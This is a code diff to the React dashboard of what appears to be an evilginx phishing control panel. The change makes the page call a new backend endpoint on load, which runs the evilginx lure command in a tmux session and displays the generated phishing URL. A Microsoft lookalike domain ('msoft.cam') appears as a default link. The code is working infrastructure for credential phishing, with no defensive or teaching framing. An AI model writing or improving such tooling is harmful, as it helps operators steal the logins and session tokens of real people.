@@ -400,13 +400,17 @@ export default function Dashboard() {
   useEffect(() => {
     console.log("Dashboard component mounted - immediate link regeneration");
 
-    // Force immediate refresh of the link by simulating dropdown selection
-    const runEvilginxCommandThroughDropdown = async () => {
+    // Force immediate refresh of the link by directly executing the evilginx command
+    const forceEvilginxCommand = async () => {
       // Get saved lure ID from localStorage
       const savedLureId = localStorage.getItem("selectedLureId");
 
       if (savedLureId) {
-        console.log("Simulating dropdown selection for lureId:", savedLureId);
+        console.log(
+          "Force executing evilginx command for lureId:",
+          savedLureId
+        );
+        setLinkLoading(true);
 
         try {
           // Force a direct call to the lures endpoint to get the index
@@ -428,33 +432,25 @@ export default function Dashboard() {
               console.log(
                 "Found lure at index:",
                 lureIndex,
-                "- DIRECTLY calling evilginx command"
+                "- DIRECTLY calling FORCE evilginx command"
               );
 
-              // DIRECTLY execute the evilginx command that the dropdown would run
-              // This ensures the command runs in the tmux session
+              // Use our new API endpoint that forces the command to run
               try {
-                // This API directly runs the evilginx command in the tmux session
-                console.log(
-                  "Making direct API call to execute evilginx command"
-                );
+                console.log("Making direct API call to FORCE evilginx command");
+
+                // Add a random timestamp to prevent any possible caching
+                const timestamp = Date.now();
                 const commandResponse = await fetch(
-                  `/api/lure-url?lureIndex=${lureIndex}`,
-                  {
-                    method: "GET",
-                    headers: {
-                      "Cache-Control": "no-cache, no-store, must-revalidate",
-                      Pragma: "no-cache",
-                      Expires: "0",
-                      "X-Force-Command": "true", // Signal to force execution
-                    },
-                  }
+                  `/api/force-lure-command?lureIndex=${lureIndex}&t=${timestamp}`
                 );
+
+                console.log("API status:", commandResponse.status);
 
                 if (commandResponse.ok) {
                   const commandData = await commandResponse.json();
                   console.log(
-                    "Evilginx command executed successfully:",
+                    "Force evilginx command executed successfully:",
                     commandData
                   );
 
@@ -463,39 +459,55 @@ export default function Dashboard() {
                     commandData.url &&
                     commandData.url !== "https://msoft.cam/wYyGBBeI"
                   ) {
+                    console.log(
+                      "Got valid URL from force command:",
+                      commandData.url
+                    );
                     setFullLink(commandData.url);
 
-                    // Also call handleLureChange to ensure UI is consistent
-                    // But we already have the link from the command
+                    // Set selected lure too
                     const selectedLure = availableLures[lureIndex];
                     setSelectedLure(selectedLure);
                     setLinkLoading(false);
                     return;
+                  } else {
+                    console.log("Invalid URL from force command:", commandData);
                   }
                 } else {
+                  const errorData = await commandResponse.text();
                   console.error(
-                    "Command execution failed with status:",
-                    commandResponse.status
+                    "Force command execution failed:",
+                    commandResponse.status,
+                    errorData
                   );
                 }
               } catch (cmdError) {
-                console.error("Error executing evilginx command:", cmdError);
+                console.error(
+                  "Error executing force evilginx command:",
+                  cmdError
+                );
               }
 
-              // If direct command execution failed, fall back to handleLureChange
-              console.log("Falling back to handleLureChange");
+              // Fall back to handleLureChange if force command failed
+              console.log(
+                "Force command failed, falling back to handleLureChange"
+              );
               handleLureChange(lureIndex.toString());
               return;
+            } else {
+              console.log("Could not find lure with ID:", savedLureId);
             }
           }
         } catch (error) {
-          console.error("Error in dropdown simulation:", error);
+          console.error("Error in force evilginx command:", error);
+        } finally {
+          setLinkLoading(false);
         }
       }
     };
 
     // Execute immediately to ensure the command runs right away
-    runEvilginxCommandThroughDropdown();
+    forceEvilginxCommand();
   }, []); // Empty dependency array means this runs once on mount
 
   // Modify the original useEffect to better handle lure selection
